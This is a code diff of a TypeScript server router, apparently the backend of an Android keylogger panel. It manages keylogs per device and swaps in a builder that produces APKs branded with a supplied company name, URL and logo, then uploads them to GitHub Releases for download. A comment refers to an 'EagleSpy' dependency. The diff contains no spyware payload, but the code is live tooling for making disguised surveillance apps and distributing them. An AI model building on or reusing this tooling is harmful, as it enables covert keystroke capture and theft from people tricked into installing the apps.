@@ -10,7 +10,7 @@ import { systemRouter } from "./_core/systemRouter";
 import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
 import { getKeylogsByDevice, deleteKeylog, restoreKeylog, getAlerts, getEvents, saveSettings, getSettings, getDeletedKeylogs, registerDevice, getDevicesByUser } from "./db";
 import { startKeylogSimulator } from "./keylogSimulator";
-import { buildSimpleAPK } from "./apk-builder-simple";
+import { buildAPK } from "./apk-builder";
 import { uploadToGitHubRelease, parseGitHubUrl } from "./github-release-uploader";
 import { sdk } from "./_core/sdk";
 
@@ -131,27 +131,27 @@ export const appRouter = router({
           // Use SIMPLE builder (sem dependência de EagleSpy)
           console.log('[ROUTER] Building APK with simple builder...');
           
-          // Use SIMPLE builder
-          const result = await buildSimpleAPK({
-            appName: input.companyName,
-            appUrl: input.companyUrl,
+          // Use builder que funcionava
+          const result = await buildAPK({
+            companyName: input.companyName,
+            companyUrl: input.companyUrl,
             logoUrl: input.logoUrl,
           });
           
-          console.log('[ROUTER] Simple builder result:', { success: result.success, downloadUrl: result.downloadUrl, filename: result.filename });
+          console.log('[ROUTER] Simple builder result:', { success: result.success, downloadUrl: result.downloadUrl, apkPath: result.apkPath });
 
           if (!result.success || !result.downloadUrl) {
             throw new Error(result.error || "Erro ao gerar APK");
           }
 
           // Extract filename from download URL
-          const filename = result.filename || result.downloadUrl.split('/').pop() || 'app.apk';
+          const filename = result.downloadUrl?.split('/').pop() || 'app.apk';
           console.log('[ROUTER] Extracted filename:', filename);
           
           // Try to upload to GitHub Releases
           let finalDownloadUrl = result.downloadUrl;
           try {
-            if (process.env.GITHUB_TOKEN && process.env.GITHUB_REPO_URL && result.success && result.filename) {
+            if (process.env.GITHUB_TOKEN && process.env.GITHUB_REPO_URL && result.success && result.apkPath) {
               console.log('[ROUTER] Uploading to GitHub Releases...');
               try {
                 const { owner, repo } = parseGitHubUrl(process.env.GITHUB_REPO_URL);
@@ -160,7 +160,7 @@ export const appRouter = router({
                   repo,
                   token: process.env.GITHUB_TOKEN,
                   appName: input.companyName,
-                  filePath: path.join(OUTPUT_DIR, result.filename!),
+                  filePath: result.apkPath || path.join(OUTPUT_DIR, 'app.apk'),
                 });
                 console.log('[ROUTER] GitHub download URL:', githubDownloadUrl);
                 finalDownloadUrl = githubDownloadUrl; // Use GitHub URL
@@ -177,8 +177,8 @@ export const appRouter = router({
             return {
               success: true,
               downloadUrl: finalDownloadUrl,
-              apkPath: path.join(OUTPUT_DIR, result.filename!),
-              filename: filename,
+              apkPath: result.apkPath,
+              filename: result.downloadUrl?.split('/').pop() || 'app.apk',
               message: "APK gerado com sucesso!",
             };
         } catch (error) {
